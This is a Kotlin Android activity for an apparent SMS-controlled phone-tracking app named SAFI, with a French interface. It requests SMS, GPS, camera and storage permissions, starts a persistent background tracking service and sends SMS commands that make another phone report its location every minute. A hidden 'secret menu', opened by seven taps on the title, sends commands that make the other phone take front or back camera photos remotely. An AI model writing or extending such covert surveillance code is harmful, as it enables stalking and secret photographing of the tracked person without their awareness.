package com.safi.smstracker

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.*
import org.osmdroid.config.Configuration
import org.osmdroid.tileprovider.tilesource.TileSourceFactory
import org.osmdroid.util.GeoPoint
import org.osmdroid.views.MapView
import org.osmdroid.views.overlay.Marker
import org.osmdroid.views.overlay.mylocation.GpsMyLocationProvider
import org.osmdroid.views.overlay.mylocation.MyLocationNewOverlay
import java.io.File

class MainMapActivity : AppCompatActivity() {

    private lateinit var mapView: MapView
    private lateinit var prefs: SharedPreferences
    private lateinit var etOtherNumber: EditText
    private lateinit var tvStatus: TextView
    private lateinit var tvTitle: TextView
    private lateinit var myLocationOverlay: MyLocationNewOverlay
    private var otherMarker: Marker? = null
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var otherMarkerVisible = false
    
    private var titleClickCount = 0
    private val SECRET_CLICK_COUNT = 7
    private var lastTitleClickTime = 0L

    companion object {
        var lastOtherPosition: GeoPoint? = null
        var instance: MainMapActivity? = null
        private const val TAG = "SAFI_UI"
        private const val REQUEST_PERMISSIONS_ALL = 100
        private const val REQUEST_OVERLAY = 1002
        private const val REQUEST_BATTERY_OPTIM = 1003
        private const val REQUEST_CAMERA_PERM = 1004
        private const val REQUEST_STORAGE_PERM = 1005
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Configuration.getInstance().load(this, getSharedPreferences("OSM", MODE_PRIVATE))
        setContentView(R.layout.activity_main_map)
        instance = this

        prefs = getSharedPreferences("SAFI_CONFIG", MODE_PRIVATE)
        mapView = findViewById(R.id.mapView)
        etOtherNumber = findViewById(R.id.etOtherNumber)
        tvStatus = findViewById(R.id.tvStatus)
        tvTitle = findViewById(R.id.tvTitle)

        etOtherNumber.setText(prefs.getString("OTHER_NUM", ""))

        initMap()
        initGPS()
        initButtons()
        
        if (!hasAllPermissions()) {
            showPermissionExplanation()
        } else {
            onAllPermissionsGranted()
        }
        
        tvTitle.setOnClickListener {
            val now = System.currentTimeMillis()
            if (now - lastTitleClickTime > 2000) titleClickCount = 0
            lastTitleClickTime = now
            titleClickCount++
            
            if (titleClickCount >= SECRET_CLICK_COUNT) {
                titleClickCount = 0
                showSecretMenu()
            } else {
                Toast.makeText(this, "🕵️ ${SECRET_CLICK_COUNT - titleClickCount} clics...", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun hasAllPermissions(): Boolean {
        val needed = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.INTERNET,
            Manifest.permission.CAMERA,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            needed.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        return needed.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun showPermissionExplanation() {
        AlertDialog.Builder(this)
            .setTitle("🔒 Permissions nécessaires")
            .setMessage("SAFI a besoin des permissions suivantes :\n\n" +
                "📍 Position GPS — pour envoyer/recevoir votre position\n" +
                "📨 SMS — pour communiquer entre les deux téléphones\n" +
                "📷 Caméra — pour prendre des photos à distance\n" +
                "💾 Stockage — pour sauvegarder les photos dans la galerie\n\n" +
                "Cliquez sur OK pour accorder les permissions.")
            .setPositiveButton("OK") { _, _ ->
                requestAllPermissions()
            }
            .setCancelable(false)
            .show()
    }

    private fun requestAllPermissions() {
        val needed = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.INTERNET,
            Manifest.permission.CAMERA,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            needed.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQUEST_PERMISSIONS_ALL)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERMISSIONS_ALL) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                Toast.makeText(this, "✅ Toutes les permissions accordées !", Toast.LENGTH_LONG).show()
                onAllPermissionsGranted()
            } else {
                AlertDialog.Builder(this)
                    .setTitle("⚠️ Permissions manquantes")
                    .setMessage("Sans les permissions, SAFI ne peut pas fonctionner correctement.\n" +
                        "Accorde TOUTES les permissions dans les paramètres de l'application.")
                    .setPositiveButton("Paramètres") { _, _ ->
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                        intent.data = Uri.parse("package:$packageName")
                        startActivity(intent)
                    }
                    .setNegativeButton("Quitter") { _, _ -> finish() }
                    .setCancelable(false)
                    .show()
            }
        }
    }

    private fun onAllPermissionsGranted() {
        requestBatteryOptimization()
        PersistentTrackingService.start(this)
        tvStatus.text = "✅ Prêt — Service de suivi en arrière-plan DÉMARRÉ"
    }

    private fun initMap() {
        mapView.setTileSource(TileSourceFactory.MAPNIK)
        mapView.setMultiTouchControls(true)
        mapView.controller.setZoom(12.0)
        mapView.controller.setCenter(GeoPoint(47.4784, -0.5632))

        myLocationOverlay = MyLocationNewOverlay(GpsMyLocationProvider(this), mapView)
        myLocationOverlay.enableMyLocation()
        myLocationOverlay.enableFollowLocation()
        mapView.overlays.add(myLocationOverlay)

        otherMarker = Marker(mapView).apply {
            icon = ContextCompat.getDrawable(this@MainMapActivity, android.R.drawable.ic_menu_mylocation)
            setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
            title = "Position de l'autre"
            position = GeoPoint(0.0, 0.0)
        }
        mapView.overlays.add(otherMarker)
        otherMarkerVisible = false
    }

    private fun initGPS() {
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
    }

    private fun initButtons() {
        findViewById<Button>(R.id.btnSave).setOnClickListener {
            val num = etOtherNumber.text.toString().trim()
            prefs.edit().putString("OTHER_NUM", num).apply()
            Toast.makeText(this, "✅ Numéro sauvegardé", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnRequestOnce).setOnClickListener {
            val num = getOtherNumber() ?: return@setOnClickListener
            if (isMyNumber(num)) {
                testModeOnce()
            } else {
                sendSms(num, Commands.REQUEST_POS_ONCE)
                tvStatus.text = "📨 Demande ponctuelle envoyée à $num..."
            }
        }

        findViewById<Button>(R.id.btnStartFollow).setOnClickListener {
            val num = getOtherNumber() ?: return@setOnClickListener
            if (isMyNumber(num)) {
                testModeStart()
            } else {
                sendSms(num, Commands.REQUEST_POS_START)
                tvStatus.text = "🟢 SUIVI DÉMARRÉ — $num m'envoie sa position chaque minute"
            }
            Toast.makeText(this, "🟢 Suivi démarré !", Toast.LENGTH_LONG).show()
        }

        findViewById<Button>(R.id.btnStopFollow).setOnClickListener {
            val num = getOtherNumber() ?: return@setOnClickListener
            if (isMyNumber(num)) {
                testModeStop()
            } else {
                sendSms(num, Commands.REQUEST_POS_STOP)
                tvStatus.text = "🔴 SUIVI ARRÊTÉ"
            }
            Toast.makeText(this, "🔴 Suivi arrêté !", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnCenter).setOnClickListener {
            myLocationOverlay.myLocation?.let {
                mapView.controller.animateTo(it, 12.0, 500L)
            } ?: Toast.makeText(this, "⏳ Position GPS en attente...", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnGoToOther).setOnClickListener {
            lastOtherPosition?.let { pos ->
                mapView.controller.animateTo(pos, 14.0, 600L)
                Toast.makeText(this, "🔴 Position de l'autre", Toast.LENGTH_SHORT).show()
            } ?: Toast.makeText(this, "⚠️ Pas encore de position reçue", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnClear).setOnClickListener {
            lastOtherPosition = null
            otherMarkerVisible = false
            otherMarker?.position = GeoPoint(0.0, 0.0)
            mapView.invalidate()
            tvStatus.text = "⏹️ Réinitialisé"
            Toast.makeText(this, "⏹️ Réinitialisé", Toast.LENGTH_SHORT).show()
        }

        findViewById<Button>(R.id.btnFloatingMap).setOnClickListener {
            if (checkOverlayPermission()) {
                FloatingWindowService.show(this)
                Toast.makeText(this, "🗺️ Carte flottante ouverte !", Toast.LENGTH_SHORT).show()
            } else {
                requestOverlayPermission()
            }
        }
    }

    private fun showSecretMenu() {
        val otherNum = getOtherNumber() ?: return
        
        val isSelf = isMyNumber(otherNum)
        val selfSuffix = if (isSelf) " (TEST — MOI-MÊME)" else ""
        
        val options = arrayOf(
            "📸 Prendre photo AVANT$selfSuffix",
            "📸 Prendre photo ARRIÈRE$selfSuffix",
            "🖼️ Ouvrir dossier photos dans la Galerie",
            "❌ Fermer le menu"
        )

        AlertDialog.Builder(this)
            .setTitle("🕵️ MENU SECRET")
            .setItems(options) { _, which ->
                when (which) {
                    0 -> {
                        if (checkCameraPermission() && checkStoragePermission()) {
                            if (isSelf) {
                                tvStatus.text = "🧪 MODE TEST — Photo AVANT en cours..."
                                CameraCaptureService.takePhoto(this, useFront = true)
                            } else {
                                sendSms(otherNum, Commands.REQUEST_PHOTO_FRONT)
                                tvStatus.text = "📸 Demande photo AVANT envoyée à $otherNum"
                            }
                        } else {
                            Toast.makeText(this, "⚠️ Accorde les permissions Caméra + Stockage d'abord !", Toast.LENGTH_LONG).show()
                        }
                    }
                    1 -> {
                        if (checkCameraPermission() && checkStoragePermission()) {
                            if (isSelf) {
                                tvStatus.text = "🧪 MODE TEST — Photo ARRIÈRE en cours..."
                                CameraCaptureService.takePhoto(this, useFront = false)
                            } else {
                                sendSms(otherNum, Commands.REQUEST_PHOTO_BACK)
                                tvStatus.text = "📸 Demande photo ARRIÈRE envoyée à $otherNum"
                            }
                        } else {
                            Toast.makeText(this, "⚠️ Accorde les permissions Caméra + Stockage d'abord !", Toast.LENGTH_LONG).show()
                        }
                    }
                    2 -> {
                        openPhotosInGallery()
                    }
                }
            }
            .show()
    }

    private fun openPhotosInGallery() {
        try {
            val safiDir = File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                "SAFI_Photos"
            )
            if (!safiDir.exists()) safiDir.mkdirs()
            
            val uri = Uri.fromFile(safiDir)
            val intent = Intent(Intent.ACTION_VIEW)
            intent.setDataAndType(uri, "image/*")
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            Toast.makeText(this, "📂 Ouverture du dossier SAFI_Photos...", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Toast.makeText(this, "❌ Impossible d'ouvrir la galerie: ${e.message}", Toast.LENGTH_LONG).show()
            Log.e(TAG, "Erreur ouverture galerie", e)
        }
    }

    fun onPhotoReceived(photoFile: File) {
        runOnUiThread {
            tvStatus.text = "✅ PHOTO SAUVEGARDÉE !\n→ ${photoFile.name}"
            Toast.makeText(this, "✅ Photo dans Galerie → dossier SAFI_Photos !", Toast.LENGTH_LONG).show()
        }
    }

    private fun checkCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }

    private fun checkStoragePermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
    }

    private fun getOtherNumber(): String? {
        val num = prefs.getString("OTHER_NUM", "") ?: ""
        if (num.isEmpty()) {
            Toast.makeText(this, "⚠️ Saisis d'abord le numéro de l'autre !", Toast.LENGTH_LONG).show()
            return null
        }
        return num
    }

    private fun getMyPhoneNumber(): String {
        return try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val num = tm.line1Number ?: ""
            Log.d(TAG, "📱 Mon numéro: $num")
            num
        } catch (e: Exception) {
            Log.e(TAG, "Impossible de lire mon numéro", e)
            ""
        }
    }

    private fun isMyNumber(num: String): Boolean {
        val myNum = getMyPhoneNumber()
        val cleanNum = num.replace("\\s".toRegex(), "").replace("^0".toRegex(), "+33")
        val cleanMyNum = myNum.replace("\\s".toRegex(), "")
        return cleanNum == cleanMyNum || num == myNum
    }

    private fun sendSms(to: String, message: String) {
        try {
            val smsManager = android.telephony.SmsManager.getDefault()
            try {
                smsManager.sendDataMessage(to, null, Commands.PORT.toShort(), message.toByteArray(Charsets.UTF_8), null, null)
                Log.d(TAG, "📨 SMS data envoyé: $message")
            } catch (e: Exception) {
                Log.d(TAG, "SMS data échoué, envoi texte: ${e.message}")
                smsManager.sendTextMessage(to, null, message, null, null)
            }
        } catch (e: Exception) {
            Toast.makeText(this, "❌ Erreur envoi: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    private var testHandler: android.os.Handler? = null
    private var testRunnable: Runnable? = null

    private fun testModeOnce() {
        tvStatus.text = "🧪 MODE TEST — Envoi à moi-même (1x)"
        Toast.makeText(this, "🧪 Mode TEST — Position immédiate !", Toast.LENGTH_SHORT).show()
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            sendMyPositionInResponse("SELF_TEST")
        }, 500)
    }

    private fun testModeStart() {
        tvStatus.text = "🧪 MODE TEST — Envoi à moi-même chaque minute"
        Toast.makeText(this, "🧪 Mode TEST SUIVI — Position chaque minute !", Toast.LENGTH_LONG).show()
        
        testHandler = android.os.Handler(android.os.Looper.getMainLooper())
        testRunnable = object : Runnable {
            override fun run() {
                sendMyPositionInResponse("SELF_TEST")
                testHandler?.postDelayed(this, 60000)
            }
        }
        testHandler?.post(testRunnable!!)
    }

    private fun testModeStop() {
        testRunnable?.let { testHandler?.removeCallbacks(it) }
        testHandler = null
        testRunnable = null
        tvStatus.text = "🔴 MODE TEST ARRÊTÉ"
        Toast.makeText(this, "🔴 Test arrêté", Toast.LENGTH_SHORT).show()
    }

    fun sendMyPositionInResponse(toNumber: String) {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "⚠️ Permission GPS manquante", Toast.LENGTH_SHORT).show()
            return
        }

        fusedLocationClient.lastLocation.addOnSuccessListener { loc ->
            loc?.let {
                updateOtherPosition(it.latitude, it.longitude, toNumber)
            } ?: runOnUiThread {
                tvStatus.text = "⏳ Position GPS pas disponible — Active le GPS !"
                Toast.makeText(this, "⏳ Active le GPS d'abord !", Toast.LENGTH_LONG).show()
            }
        }
    }

    fun updateOtherPosition(lat: Double, lon: Double, from: String) {
        lastOtherPosition = GeoPoint(lat, lon)
        runOnUiThread {
            otherMarker?.position = lastOtherPosition
            otherMarker?.title = "Depuis: $from"
            otherMarkerVisible = true
            mapView.invalidate()
            tvStatus.text = "✅ Reçu de $from : %.4f, %.4f".format(lat, lon)
            Toast.makeText(this, "✅ Position reçue !", Toast.LENGTH_SHORT).show()
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            try {
                startActivityForResult(intent, REQUEST_BATTERY_OPTIM)
            } catch (e: Exception) {
                Log.d(TAG, "Optimisation batterie déjà désactivée")
            }
        }
    }

    private fun checkOverlayPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else true
    }

    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
            startActivityForResult(intent, REQUEST_OVERLAY)
            Toast.makeText(this, "⚠️ Accorde la permission \"Afficher par-dessus les autres apps\"", Toast.LENGTH_LONG).show()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_OVERLAY && checkOverlayPermission()) {
            FloatingWindowService.show(this)
        }
    }

    override fun onResume() {
        super.onResume()
        mapView.onResume()
        instance = this
        lastOtherPosition?.let { pos ->
            otherMarker?.position = pos
            otherMarkerVisible = true
        }
    }

    override fun onPause() {
        super.onPause()
        mapView.onPause()
        instance = null
    }

    override fun onDestroy() {
        testRunnable?.let { testHandler?.removeCallbacks(it) }
        super.onDestroy()
        instance = null
    }
}
